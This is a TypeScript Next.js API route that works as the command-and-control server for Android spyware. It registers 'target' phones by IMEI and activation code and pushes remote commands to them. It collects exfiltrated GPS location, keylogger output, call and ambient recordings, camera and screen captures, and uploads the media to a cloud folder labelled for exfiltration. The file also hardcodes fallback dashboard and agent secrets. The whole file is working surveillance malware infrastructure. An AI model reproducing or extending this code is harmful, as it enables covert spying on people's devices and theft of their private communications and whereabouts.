import { NextResponse } from "next/server";
import { getServerSession } from "@/lib/session";
import { supabaseAdmin } from "@/lib/supabaseAdmin";
import { v2 as cloudinary } from "cloudinary";
import fs from "fs";
import path from "path";
import zlib from "zlib";

// Configure Cloudinary server-side
cloudinary.config({
  cloud_name: process.env.NEXT_PUBLIC_CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
});

const LOG_FILE = path.join(process.cwd(), "c2_exfiltrated_data.json");
const ACTIVATION_CODES_FILE = path.join(process.cwd(), "c2_activation_codes.json");
const DEVICES_FILE = path.join(process.cwd(), "c2_registered_devices.json");

// In-memory C2 state
let serverConfig = {
  location_tracking: true,
  accessibility_keylogger: true,
  mic_recording: false,
  whatsapp_harvest: false,
  mode: "live", // "live" or "recorded"
  auth_password: "Work in process", // Hidden/Masked
  low_bandwidth_mode: true, // 2G/3G low data mode
  camera_quality: "low",    // "low" (360p adaptive) or "high" (1080p)
  screen_stream: false,
  mic_quality: "low"        // "low" (AMR/Opus) or "high"
};

let currentCommand = "none";
let targetDeviceCommand = "ALL";

// High-reliability multi-device command queue
interface BroadcastCommand {
  id: string;
  command: string;
  dispatchedTo: Set<string>;
  createdAt: number;
}

let broadcastCommands: BroadcastCommand[] = [];
let deviceCommandQueues: Record<string, string[]> = {};

// Multi-device live registry
interface DeviceRecord {
  device_id: string;
  model: string;
  os: string;
  last_seen: string;
  ip: string;
  battery?: number | string;
  network?: string;
  is_rooted?: boolean;
  latitude?: number;
  longitude?: number;
  active_app?: string;
  activation_code?: string;
  app_service_id?: number | string;
  sim_id?: string;
  imei?: string;
}

let registeredDevices: Record<string, DeviceRecord> = {};

// Helper: load persistent registered devices
function loadRegisteredDevices(): Record<string, DeviceRecord> {
  try {
    if (fs.existsSync(DEVICES_FILE)) {
      const data = JSON.parse(fs.readFileSync(DEVICES_FILE, "utf-8"));
      if (data && typeof data === "object") {
        return { ...data, ...registeredDevices };
      }
    }
  } catch (e) {}
  return registeredDevices;
}

// Helper: persist registered device to disk
function persistRegisteredDevice(dev: DeviceRecord) {
  registeredDevices[dev.device_id] = dev;
  if (dev.imei) registeredDevices[dev.imei] = dev;
  if (dev.app_service_id) registeredDevices[`DEV_${dev.app_service_id}`] = dev;

  try {
    const all = loadRegisteredDevices();
    all[dev.device_id] = dev;
    if (dev.imei) all[dev.imei] = dev;
    if (dev.app_service_id) all[`DEV_${dev.app_service_id}`] = dev;
    fs.writeFileSync(DEVICES_FILE, JSON.stringify(all, null, 2));
  } catch (e) {}
}

// Helper: update device heartbeat
function touchDeviceHeartbeat(identifier: string, ip?: string, extra?: Partial<DeviceRecord>) {
  const all = loadRegisteredDevices();
  const existing = all[identifier] || registeredDevices[identifier] || {
    device_id: identifier,
    model: "Android Target",
    os: "Android",
    last_seen: new Date().toISOString(),
    ip: ip || "127.0.0.1",
    network: "WiFi / 4G",
    is_rooted: false
  };

  const updated: DeviceRecord = {
    ...existing,
    ...extra,
    last_seen: new Date().toISOString(),
    ip: ip || existing.ip || "127.0.0.1"
  };

  persistRegisteredDevice(updated);
}

export interface ActivationCodeRecord {
  code: string;       // Purely numerical (e.g. "84920153")
  name: string;       // Name / Label (e.g. "Officer Wasim", "Target 01")
  createdAt: string;
  status: "active" | "used";
  usedByDevice?: string;
}

// Helper: load activation codes
function getActivationCodeRecords(): ActivationCodeRecord[] {
  try {
    if (fs.existsSync(ACTIVATION_CODES_FILE)) {
      const data = JSON.parse(fs.readFileSync(ACTIVATION_CODES_FILE, "utf-8"));
      if (Array.isArray(data) && data.length > 0) {
        // Normalize if legacy array of strings
        return data.map((item: any, idx: number) => {
          if (typeof item === "string") {
            const numOnly = item.replace(/\D/g, "") || (10012026 + idx).toString();
            return {
              code: numOnly,
              name: "Target " + numOnly.slice(-4),
              createdAt: new Date().toISOString(),
              status: "active"
            };
          }
          return {
            ...item,
            code: (item.code || "").toString().replace(/\D/g, "") || (10012026 + idx).toString(),
            name: item.name || "Target Device",
            status: item.status || "active"
          };
        });
      }
    }
  } catch (e) {}

  // Purely numerical default codes
  const defaults: ActivationCodeRecord[] = [
    { code: "10012026", name: "HQ Field Unit 1", createdAt: new Date().toISOString(), status: "active" },
    { code: "84920153", name: "Target Device A", createdAt: new Date().toISOString(), status: "active" },
    { code: "77492018", name: "Intel Special Ops", createdAt: new Date().toISOString(), status: "active" },
    { code: "39201847", name: "Surveillance Unit 3", createdAt: new Date().toISOString(), status: "active" }
  ];

  try {
    fs.writeFileSync(ACTIVATION_CODES_FILE, JSON.stringify(defaults, null, 2));
  } catch (e) {}
  return defaults;
}

function getActivationCodes(): string[] {
  return getActivationCodeRecords().map(r => r.code);
}

// Helper: save new numerical activation code with name
function saveActivationCode(code: string, name?: string): ActivationCodeRecord[] {
  const records = getActivationCodeRecords();
  // Ensure code is strictly numerical
  const cleanCode = code.replace(/\D/g, "") || Math.floor(10000000 + Math.random() * 90000000).toString();
  const existingIndex = records.findIndex(r => r.code === cleanCode);
  const targetName = name?.trim() || `Target ${cleanCode.slice(-4)}`;

  if (existingIndex >= 0) {
    if (name?.trim()) {
      records[existingIndex].name = targetName;
    }
  } else {
    records.unshift({
      code: cleanCode,
      name: targetName,
      createdAt: new Date().toISOString(),
      status: "active"
    });
  }

  try {
    fs.writeFileSync(ACTIVATION_CODES_FILE, JSON.stringify(records, null, 2));
  } catch (e) {}
  return records;
}

// Helper: Record log entry safely
async function recordLog(logEntry: any) {
  const timestamp = logEntry.timestamp || new Date().toISOString();
  logEntry.timestamp = timestamp;

  // Supabase insert
  if (supabaseAdmin) {
    try {
      await supabaseAdmin.from("c2_logs").insert([
        {
          device_id: logEntry.device_id || "APP_TARGET",
          log_type: logEntry.type || logEntry.log_type || "telemetry",
          payload: logEntry,
          created_at: timestamp
        }
      ]);
    } catch (dbErr) {
      console.warn("Supabase log insert fallback:", dbErr);
    }
  }

  // Backup to local file (last 500 logs)
  let logs: any[] = [];
  try {
    if (fs.existsSync(LOG_FILE)) {
      logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf-8"));
    }
  } catch (e) {
    logs = [];
  }
  logs.unshift(logEntry);
  if (logs.length > 500) {
    logs = logs.slice(0, 500);
  }
  try {
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
  } catch (e) {}
}

export async function GET(request: Request) {
  try {
    const url = new URL(request.url);
    const pathname = url.pathname.toLowerCase();
    const appServiceId = url.searchParams.get("appServiceId");
    const clientIp = request.headers.get("x-forwarded-for") || "127.0.0.1";

    // 1. App polling for pending commands: `preference/pendingcommand?appServiceId=...`
    if (appServiceId || pathname.includes("pendingcommand")) {
      const sId = appServiceId || "ALL";

      // Device Heartbeat: update last_seen whenever the agent polls C2
      if (appServiceId) {
        touchDeviceHeartbeat(`DEV_${appServiceId}`, clientIp, {
          app_service_id: parseInt(appServiceId, 10)
        });
      }

      let commandToDeliver: string | null = null;

      // Check device specific queue
      if (deviceCommandQueues[sId] && deviceCommandQueues[sId].length > 0) {
        commandToDeliver = deviceCommandQueues[sId].shift()!;
      }
      // Check broadcast queue
      else if (broadcastCommands.length > 0) {
        const nowMs = Date.now();
        broadcastCommands = broadcastCommands.filter(b => nowMs - b.createdAt < 600000);
        for (const b of broadcastCommands) {
          if (!b.dispatchedTo.has(sId)) {
            b.dispatchedTo.add(sId);
            commandToDeliver = b.command;
            break;
          }
        }
      } else if (currentCommand !== "none" && (targetDeviceCommand === "ALL" || targetDeviceCommand === sId)) {
        commandToDeliver = currentCommand;
        if (targetDeviceCommand !== "ALL") currentCommand = "none";
      }

      if (commandToDeliver) {
        return NextResponse.json([
          {
            id: 1,
            appServiceId: parseInt(appServiceId || "1001", 10),
            command: commandToDeliver,
            dateCreated: Date.now()
          }
        ]);
      } else {
        return NextResponse.json([]);
      }
    }

    // 2. Dashboard telemetry query (requires Super Admin)
    const session = await getServerSession();
    if (!session || session.role !== "super_admin") {
      return NextResponse.json({ error: "Unauthorized: Super Admin access required" }, { status: 403 });
    }

    let logs: any[] = [];
    if (supabaseAdmin) {
      try {
        const { data, error } = await supabaseAdmin
          .from("c2_logs")
          .select("*")
          .order("created_at", { ascending: false })
          .limit(100);
        
        if (!error && data) {
          logs = data.map((row: any) => ({
            ...row.payload,
            id: row.id,
            timestamp: row.created_at
          }));
        }
      } catch (dbErr) {
        console.warn("Supabase fetch fallback:", dbErr);
      }
    }

    if (logs.length === 0 && fs.existsSync(LOG_FILE)) {
      try {
        logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf-8"));
      } catch (err) {
        logs = [];
      }
    }

    const now = Date.now();
    const savedDevicesMap = loadRegisteredDevices();
    const deviceMap = new Map<string, any>();

    // 1. Populate from persistent devices (within 5 minutes = online)
    Object.values(savedDevicesMap).forEach((dev: DeviceRecord) => {
      const lastSeenMs = dev.last_seen ? new Date(dev.last_seen).getTime() : 0;
      const isOnline = (now - lastSeenMs) < 300000; // 5 minutes heartbeat
      const key = dev.imei || dev.device_id;
      deviceMap.set(key, {
        ...dev,
        is_online: isOnline
      });
    });

    // 2. Cross-reference with telemetry logs
    logs.forEach((l: any) => {
      const dId = l.device_id || l.imei || (l.appServiceId ? `DEV_${l.appServiceId}` : null);
      if (dId) {
        const lastSeenMs = l.timestamp ? new Date(l.timestamp).getTime() : 0;
        const isOnline = (now - lastSeenMs) < 300000;
        if (!deviceMap.has(dId)) {
          deviceMap.set(dId, {
            device_id: dId,
            model: l.device_model || l.serviceModel || "Android Target",
            os: l.os_version || "Android",
            last_seen: l.timestamp || new Date().toISOString(),
            ip: l.registrationIP || l.ip || "Mobile Sync",
            battery: l.battery ?? null,
            network: l.network || "WiFi / 4G",
            is_rooted: l.is_rooted || false,
            latitude: l.latitude || l.geoLocationLattitude,
            longitude: l.longitude || l.geoLocationLongitude,
            is_online: isOnline,
            activation_code: l.activationCode || l.activation_code || "KPTS-DEFAULT"
          });
        } else {
          const existing = deviceMap.get(dId);
          const existingLastSeenMs = new Date(existing.last_seen || 0).getTime();
          if (lastSeenMs > existingLastSeenMs) {
            existing.last_seen = l.timestamp;
            existing.is_online = isOnline;
          }
        }
      }
    });

    const deviceList: any[] = Array.from(deviceMap.values());
    const connectedCount = deviceList.filter(d => d.is_online).length;

    return NextResponse.json({
      success: true,
      config: serverConfig,
      command: currentCommand,
      target_device: targetDeviceCommand,
      devices: deviceList,
      connected_count: connectedCount,
      total_devices_count: deviceList.length,
      activation_codes: getActivationCodes(),
      activation_records: getActivationCodeRecords(),
      app_endpoint: "https://kpts.com.pk/c2/",
      logs: logs
    });
  } catch (error: any) {
    return NextResponse.json({ error: error.message || "Internal server error" }, { status: 500 });
  }
}

export async function POST(request: Request) {
  try {
    const url = new URL(request.url);
    const pathname = url.pathname.toLowerCase();
    const clientIp = request.headers.get("x-forwarded-for") || "127.0.0.1";

    // Detect Content-Type
    const contentType = request.headers.get("content-type") || "";

    // ---------------------------------------------------------
    // A. HANDLE MULTIPART / BINARY ASSET UPLOADS (PHOTO, AUDIO, SCREENRECORD)
    // ---------------------------------------------------------
    if (
      pathname.includes("upload/asset") || 
      pathname.includes("screenrecord") || 
      contentType.includes("multipart/form-data") ||
      contentType.includes("image/") ||
      contentType.includes("audio/") ||
      contentType.includes("video/")
    ) {
      let cloudinaryUrl: string | null = null;
      let tags = url.searchParams.get("tags") || "asset_recording";
      let appServiceId = url.searchParams.get("appServiceId") || "1001";
      let photoName = url.searchParams.get("photoName") || "asset_" + Date.now();

      try {
        if (contentType.includes("multipart/form-data")) {
          const formData = await request.formData();
          const file = formData.get("file") || formData.get("sysfileg") || formData.get("sysfilea") || Array.from(formData.values())[0];
          if (file && typeof file !== "string") {
            const buffer = Buffer.from(await (file as Blob).arrayBuffer());
            const uploadRes = await new Promise<any>((resolve, reject) => {
              cloudinary.uploader.upload_stream(
                { folder: "c2_media_exfil", resource_type: "auto" },
                (error, result) => {
                  if (error) reject(error);
                  else resolve(result);
                }
              ).end(buffer);
            });
            cloudinaryUrl = uploadRes?.secure_url;
          }
        } else {
          // Direct binary buffer upload
          const buffer = Buffer.from(await request.arrayBuffer());
          if (buffer.length > 0) {
            const uploadRes = await new Promise<any>((resolve, reject) => {
              cloudinary.uploader.upload_stream(
                { folder: "c2_media_exfil", resource_type: "auto" },
                (error, result) => {
                  if (error) reject(error);
                  else resolve(result);
                }
              ).end(buffer);
            });
            cloudinaryUrl = uploadRes?.secure_url;
          }
        }
      } catch (assetErr) {
        console.warn("Media cloud upload warning:", assetErr);
      }

      await recordLog({
        type: pathname.includes("cr") ? "call_recording" : pathname.includes("sr") ? "surround_recording" : pathname.includes("photo") ? "camera" : "screen_recording",
        device_id: `DEV_${appServiceId}`,
        cloudinary_url: cloudinaryUrl,
        asset_name: photoName,
        tags: tags,
        timestamp: new Date().toISOString()
      });

      return NextResponse.json({ status: "success", code: 200, message: "Asset uploaded successfully" });
    }

    // ---------------------------------------------------------
    // B. HANDLE GZIP COMPRESSED & PLAIN JSON BODIES
    // ---------------------------------------------------------
    let rawBodyStr = "";
    try {
      const buffer = Buffer.from(await request.arrayBuffer());
      const contentEncoding = request.headers.get("content-encoding") || "";
      const isGzip = contentEncoding.includes("gzip") || (buffer.length > 2 && buffer[0] === 0x1f && buffer[1] === 0x8b);
      
      if (isGzip) {
        rawBodyStr = zlib.gunzipSync(buffer).toString("utf-8");
      } else {
        rawBodyStr = buffer.toString("utf-8");
      }
    } catch (readErr) {
      console.warn("Failed reading raw body, trying text fallback:", readErr);
    }

    let body: any = {};
    if (rawBodyStr) {
      try {
        body = JSON.parse(rawBodyStr);
      } catch (jsonErr) {
        body = { raw_content: rawBodyStr };
      }
    }

    // ---------------------------------------------------------
    // 1. APP AUTHENTICATION HANDSHAKE: `register/auth/`
    // ---------------------------------------------------------
    if (pathname.includes("register/auth") || (body.userEmail && body.password && !body.action)) {
      const userEmail = body.userEmail || "officer@kpts.com.pk";
      const userName = userEmail.includes("@") ? userEmail.split("@")[0] : userEmail;

      const authRecord = {
        appUserId: 1001,
        authResponse: 1, // 1 = Authentication Success in latestapp
        userName: userName,
        userEmail: userEmail,
        password: body.password || ""
      };

      await recordLog({
        type: "app_authentication",
        userEmail: userEmail,
        userName: userName,
        ip: clientIp,
        timestamp: new Date().toISOString()
      });

      return NextResponse.json(authRecord);
    }

    // ---------------------------------------------------------
    // 2. APP DEVICE REGISTRATION & ACTIVATION: `register/activate/`
    // ---------------------------------------------------------
    if (pathname.includes("register/activate") || body.activationCode || (body.deviceSerial && body.serviceName)) {
      const imei = body.imeiNo || body.deviceSerial || "IMEI_" + Math.random().toString(36).substring(2, 10).toUpperCase();
      const activationCode = body.activationCode || "KPTS-2026-LIVE";
      const model = body.serviceModel || body.deviceModel || "Android Target";
      const os = "Android " + (body.osVersion || "13");

      // Generate stable numeric service & user ID
      let numericId = 100000;
      for (let i = 0; i < imei.length; i++) {
        numericId = (numericId * 31 + imei.charCodeAt(i)) % 900000 + 100000;
      }

      registeredDevices[imei] = {
        device_id: imei,
        model: model,
        os: os,
        last_seen: new Date().toISOString(),
        battery: 95,
        network: "WiFi / 4G",
        is_rooted: false,
        ip: clientIp,
        active_app: "App Activated",
        activation_code: activationCode,
        app_service_id: numericId,
        sim_id: body.simId || "SIM-01",
        imei: imei
      };
      persistRegisteredDevice(registeredDevices[imei]);

      // Ensure code is in activation codes list and mark as used
      const records = saveActivationCode(activationCode, undefined);
      const recIdx = records.findIndex(r => r.code === activationCode.replace(/\D/g, ""));
      if (recIdx >= 0) {
        records[recIdx].status = "used";
        records[recIdx].usedByDevice = imei;
        try { fs.writeFileSync(ACTIVATION_CODES_FILE, JSON.stringify(records, null, 2)); } catch (e) {}
      }

      await recordLog({
        type: "device_activation",
        device_id: imei,
        model: model,
        os_version: os,
        activation_code: activationCode,
        app_service_id: numericId,
        ip: clientIp,
        timestamp: new Date().toISOString()
      });

      // Returns UserInfo expected by latestapp RegistrationManager
      return NextResponse.json({
        appServiceId: numericId,
        appUserId: 1001,
        userName: model,
        errorCode: 0,
        reason: "Device successfully activated with KPTS C2",
        hadDevice: 1,
        hadUser: 1
      });
    }

    // ---------------------------------------------------------
    // 3. APP SOFTWARE BUILD ATTR & PUSH REGISTRATION
    // ---------------------------------------------------------
    if (pathname.includes("register/attr/build") || pathname.includes("register/push")) {
      return NextResponse.json({ status: "success", code: 200 });
    }

    // ---------------------------------------------------------
    // 4. APP COMMAND ACKNOWLEDGEMENT: `preference/command/ack/`
    // ---------------------------------------------------------
    if (pathname.includes("command/ack")) {
      return NextResponse.json({ status: "acknowledged", code: 200 });
    }

    // ---------------------------------------------------------
    // 5. APP ALERTS: `alert/notify/`
    // ---------------------------------------------------------
    if (pathname.includes("alert/notify")) {
      await recordLog({
        type: "alert_notification",
        device_id: body.appServiceId ? `DEV_${body.appServiceId}` : "TARGET_DEVICE",
        payload: body,
        timestamp: new Date().toISOString()
      });
      return NextResponse.json({ status: "success", code: 200 });
    }

    // ---------------------------------------------------------
    // 6. APP SURVEILLANCE PAYLOAD INGESTION: `payload/...`
    // ---------------------------------------------------------
    if (pathname.includes("payload/") || body.content || body.listContents) {
      const appServiceId = body.appServiceId || url.searchParams.get("appServiceId") || "1001";
      const deviceId = body.activationCode ? `DEV_${body.activationCode}` : `DEV_${appServiceId}`;
      const moduleType = body.moduleType || pathname.split("/payload/")[1]?.replace(/\//g, "") || "telemetry";

      // Parse payload content
      let extractedData: any = body.listContents || body.content || body;
      if (typeof extractedData === "string") {
        try {
          extractedData = JSON.parse(extractedData);
        } catch (e) {
          // Keep as string
        }
      }

      // Geolocation update
      let latVal: number | undefined;
      let lngVal: number | undefined;
      if (moduleType.includes("geo") && extractedData) {
        const lat = extractedData.latitude || extractedData.geoLocationLattitude || (Array.isArray(extractedData) && extractedData[0]?.geoLocationLattitude);
        const lng = extractedData.longitude || extractedData.geoLocationLongitude || (Array.isArray(extractedData) && extractedData[0]?.geoLocationLongitude);
        if (lat && lng) {
          latVal = parseFloat(lat);
          lngVal = parseFloat(lng);
        }
      }

      // Battery update
      let batteryVal: any = undefined;
      if (moduleType.includes("device") && extractedData && extractedData.battery !== undefined) {
        batteryVal = extractedData.battery;
      }

      // Update registered device heartbeat & persist
      touchDeviceHeartbeat(deviceId, clientIp, {
        latitude: latVal,
        longitude: lngVal,
        battery: batteryVal
      });

      await recordLog({
        type: moduleType,
        device_id: deviceId,
        data: extractedData,
        raw_body: body,
        timestamp: new Date().toISOString()
      });

      // Call logs in latestapp can expect callLogResponse array or status
      if (pathname.includes("call")) {
        return NextResponse.json([{ clientCallId: 1, serverCallId: 1 }]);
      }

      return NextResponse.json({ status: "success", code: 200 });
    }

    // ---------------------------------------------------------
    // 7. DASHBOARD ACTIONS & EXISTING AGENT BEACON
    // ---------------------------------------------------------
    const { action, config, command, beaconData, target_device } = body;

    // A. Dashboard Security Gate verification
    if (action === "verify_dashboard_password") {
      const expectedPassword = process.env.C2_DASHBOARD_PASSWORD || "123###321###11@@#";
      if (body.password === expectedPassword) {
        return NextResponse.json({ success: true, authorized: true, statusText: "Work in process" });
      } else {
        return NextResponse.json({ error: "Invalid password", authorized: false }, { status: 401 });
      }
    }

    // B. Agent beacon reporting in
    if (beaconData) {
      const agentSecret = body.agent_secret || request.headers.get("X-Agent-Secret");
      const expectedSecret = process.env.C2_AGENT_SECRET || "c2_sec_fb42681f7b642a7eb1df52f5e22a87bc002da5cd578cc3a41b87e197b671edfd";
      if (!expectedSecret || agentSecret !== expectedSecret) {
        return NextResponse.json({ error: "Unauthorized: Invalid agent secret" }, { status: 403 });
      }

      const timestamp = new Date().toISOString();
      let processedBeacon = { ...beaconData, timestamp };
      const headerDeviceId = request.headers.get("X-Device-ID") || request.headers.get("x-device-id");
      const headerModel = request.headers.get("X-Device-Model") || request.headers.get("x-device-model");
      const headerOs = request.headers.get("X-Device-OS") || request.headers.get("x-device-os");

      const deviceId = headerDeviceId || body.device_id || processedBeacon.device_id || "UNKNOWN_DEVICE";
      const model = headerModel || processedBeacon.device_model || "Android Target";
      const os = headerOs || processedBeacon.os_version || "Android";

      processedBeacon.device_id = deviceId;
      processedBeacon.device_model = model;
      processedBeacon.os_version = os;

      registeredDevices[deviceId] = {
        device_id: deviceId,
        model,
        os,
        last_seen: timestamp,
        battery: processedBeacon.battery ?? 88,
        network: processedBeacon.network ?? "WiFi / 4G",
        is_rooted: processedBeacon.is_rooted ?? false,
        latitude: processedBeacon.latitude,
        longitude: processedBeacon.longitude,
        active_app: processedBeacon.package || processedBeacon.active_app,
        ip: clientIp
      };

      await recordLog(processedBeacon);

      let commandToExecute = "none";
      if (deviceCommandQueues[deviceId] && deviceCommandQueues[deviceId].length > 0) {
        commandToExecute = deviceCommandQueues[deviceId].shift()!;
      } else if (broadcastCommands.length > 0) {
        for (const b of broadcastCommands) {
          if (!b.dispatchedTo.has(deviceId)) {
            b.dispatchedTo.add(deviceId);
            commandToExecute = b.command;
            break;
          }
        }
      } else if (currentCommand !== "none" && (targetDeviceCommand === "ALL" || targetDeviceCommand === deviceId)) {
        commandToExecute = currentCommand;
        if (targetDeviceCommand !== "ALL") currentCommand = "none";
      }

      return NextResponse.json({
        status: "success",
        config: serverConfig,
        command: commandToExecute,
        target_device: deviceId
      });
    }

    // C. Dashboard Management Actions (Super Admin only)
    const session = await getServerSession();
    if (!session || session.role !== "super_admin") {
      return NextResponse.json({ error: "Unauthorized: Super Admin access required" }, { status: 403 });
    }

    if (action === "ping_device" || action === "ping") {
      const target = target_device || "ALL";
      const pingCmd = "3-1-1"; // PREFERENCE_SYNC prompts immediate Android agent sync

      if (target === "ALL") {
        broadcastCommands.push({
          id: "cmd_ping_" + Date.now(),
          command: pingCmd,
          dispatchedTo: new Set<string>(),
          createdAt: Date.now()
        });
      } else {
        if (!deviceCommandQueues[target]) deviceCommandQueues[target] = [];
        deviceCommandQueues[target].push(pingCmd);
      }

      await recordLog({
        type: "c2_ping",
        target_device: target,
        command: pingCmd,
        timestamp: new Date().toISOString()
      });

      return NextResponse.json({
        success: true,
        message: `Ping dispatched to ${target}`,
        command: pingCmd,
        target_device: target,
        timestamp: new Date().toISOString()
      });
    }

    if (action === "generate_activation_code") {
      // Generate a purely NUMERICAL 8-digit code (no letters/dashes)
      const newCode = Math.floor(10000000 + Math.random() * 90000000).toString();
      const codeName = body.name?.trim() || `Target ${newCode.slice(-4)}`;
      const updatedRecords = saveActivationCode(newCode, codeName);
      return NextResponse.json({
        success: true,
        new_code: newCode,
        name: codeName,
        activation_codes: updatedRecords.map(r => r.code),
        activation_records: updatedRecords
      });
    }

    if (action === "add_activation_code") {
      // Add a custom numerical code with a name
      const rawCode = (body.code || "").toString().replace(/\D/g, "");
      if (!rawCode) {
        return NextResponse.json({ error: "Code must be numerical only" }, { status: 400 });
      }
      const codeName = body.name?.trim() || `Target ${rawCode.slice(-4)}`;
      const updatedRecords = saveActivationCode(rawCode, codeName);
      return NextResponse.json({
        success: true,
        new_code: rawCode,
        name: codeName,
        activation_codes: updatedRecords.map(r => r.code),
        activation_records: updatedRecords
      });
    }

    if (action === "delete_activation_code") {
      const targetCode = (body.code || "").toString().replace(/\D/g, "");
      let records = getActivationCodeRecords();
      records = records.filter(r => r.code !== targetCode);
      try {
        fs.writeFileSync(ACTIVATION_CODES_FILE, JSON.stringify(records, null, 2));
      } catch (e) {}
      return NextResponse.json({
        success: true,
        activation_codes: records.map(r => r.code),
        activation_records: records
      });
    }

    if (action === "update_config" && config) {
      serverConfig = { ...serverConfig, ...config };
    } else if (action === "set_command" && command) {
      const target = target_device || "ALL";
      currentCommand = command;
      targetDeviceCommand = target;

      if (target === "ALL") {
        broadcastCommands.push({
          id: "cmd_" + Date.now() + "_" + Math.random().toString(36).substring(2, 7),
          command: command,
          dispatchedTo: new Set<string>(),
          createdAt: Date.now()
        });
      } else {
        if (!deviceCommandQueues[target]) deviceCommandQueues[target] = [];
        deviceCommandQueues[target].push(command);
      }
    } else if (action === "clear_logs") {
      if (supabaseAdmin) {
        try {
          if (target_device && target_device !== "ALL") {
            await supabaseAdmin.from("c2_logs").delete().eq("device_id", target_device);
          } else {
            await supabaseAdmin.from("c2_logs").delete().neq("id", 0);
          }
        } catch (e) {}
      }
      try {
        fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
      } catch (e) {}
    }

    return NextResponse.json({
      success: true,
      config: serverConfig,
      command: currentCommand,
      target_device: targetDeviceCommand,
      activation_codes: getActivationCodes(),
      activation_records: getActivationCodeRecords()
    });
  } catch (error: any) {
    return NextResponse.json({ error: error.message || "Internal server error" }, { status: 500 });
  }
}
